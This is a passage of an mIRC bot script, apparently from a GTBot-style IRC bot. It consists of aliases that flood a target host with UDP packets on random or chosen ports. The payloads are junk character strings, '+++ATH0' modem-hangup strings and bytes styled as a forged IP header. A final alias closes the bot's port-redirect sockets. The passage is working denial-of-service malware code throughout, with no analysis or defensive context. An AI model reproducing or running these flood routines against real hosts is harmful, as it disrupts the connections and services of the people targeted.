^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n93=  %zZnum.prt2 = $rand(1,65000) 
n94=  sockudp zZupdr2 $1 $2 %zZnum.prt2  + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n95=  %zZnum.prt3 = $rand(1,65000)
n96=  sockudp zZupdr3 $1 $2 %zZnum.prt3  0x45,0x00,0x00,0x26,0x12,0x34,0x00,0x00,0xFF,0x11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x00,0x12,0x00,0x00,'1','2','3','4','5','6','7','8','9','0'
n97=  %zZnum.prt4 = $rand(1,65000)
n98=  sockudp zZupdr4 $1 $2 %zZnum.prt4  @!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!
n99=  %zZnum.prt5 = $rand(1,65000)
n100=  sockudp zZupdr5 $1 $2 %zZnum.prt5  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n101=  %zZnum.prt6 = $rand(1,65000)
n102=  sockudp zZupdr6 $1 $2 %zZnum.prt6  + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n103=  %zZnum.prt7 = $rand(1,65000)
n104=  sockudp zZupdr7 $1 $2 %zZnum.prt7  0x45,0x00,0x00,0x26,0x12,0x34,0x00,0x00,0xFF,0x11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x00,0x12,0x00,0x00,'1','2','3','4','5','6','7','8','9','0'
n105=  %zZnum.prt8 = $rand(1,65000)
n106=  sockudp zZupdr8 $1 $2 %zZnum.prt8  @!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@
n107=  %zZnum.prt9 = $rand(1,65000)
n108=  sockudp zZupdr9 $1 $2 %zZnum.prt9  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n109=  %zZnum.prt10 = $rand(1,65000)
n110=  sockudp zZupdr10 $1 $2 %zZnum.prt10  0x45,0x00,0x00,0x26,0x12,0x34,0x00,0x00,0xFF,0x11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x00,0x12,0x00,0x00,'1','2','3','4','5','6','7','8','9','0'
n111=  unset %zZnum.prt*
n112=} 
n113=/zportudp {
n114=  sockudp zZupd1 $1 $2 $3  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n115=  sockudp zZupd2 $1 $2 $3  + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n116=  sockudp zZupd3 $1 $2 $3  0x45,0x00,0x00,0x26,0x12,0x34,0x00,0x00,0xFF,0x11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x00,0x12,0x00,0x00,'1','2','3','4','5','6','7','8','9','0'
n117=  sockudp zZupd4 $1 $2 $3  @!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!
n118=  sockudp zZupd5 $1 $2 $3  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n119=  sockudp zZupd6 $1 $2 $3  0x45,0x00,0x00,0x26,0x12,0x34,0x00,0x00,0xFF,0x11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x00,0x12,0x00,0x00,'1','2','3','4','5','6','7','8','9','0'
n120=  sockudp zZupd7 $1 $2 $3  + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n121=  sockudp zZupd8 $1 $2 $3  !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n122=  sockudp zZupd9 $1 $2 $3  0x45,0x00,0x00,0x26,0x12,0x34,0x00,0x00,0xFF,0x11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x00,0x12,0x00,0x00,'1','2','3','4','5','6','7','8','9','0'
n123=  sockudp zZupd10 $1 $2 $3  @!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@!@
n124=}
n125=/pdirectstop { 
n126=  Set %gtrdstoppnum $1 
n127=  sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ]  
n128=  sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ *  
n129=  sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ *  
n130=  unset %gtrdstoppnum 
n131=}
